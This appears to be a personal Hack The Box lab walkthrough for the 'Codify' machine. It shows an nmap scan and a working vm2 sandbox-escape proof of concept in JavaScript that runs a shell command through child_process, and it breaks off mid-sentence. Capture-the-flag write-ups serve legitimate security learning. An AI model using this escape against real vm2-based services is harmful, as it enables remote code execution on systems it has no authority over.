![[Codify.png]]
#HackTheBox #Machines #Seasons #Easy 
## 1
```bash
nmap -sCVS -Pn -T4 -oN nmap.txt 10.10.11.233
```
The result is `22/tcp`,`80/tcp`,`3000/tcp`
## 2
Go to your browser, and paste the IP address. In the website, click About us navigation. Under about us there is about our code editor, there is hyperlink text that leads to a website, the website shows a version of the code editor.
After that, search on google `vm {version} exploit`[cuy](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244). Choose the one at the top, if possible, the one from the GitHub website. there is a code that has been given by someone, but the code is still wrong.
```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```
Examine the code, then you will find the Linux command. If you have found it, change the command with ``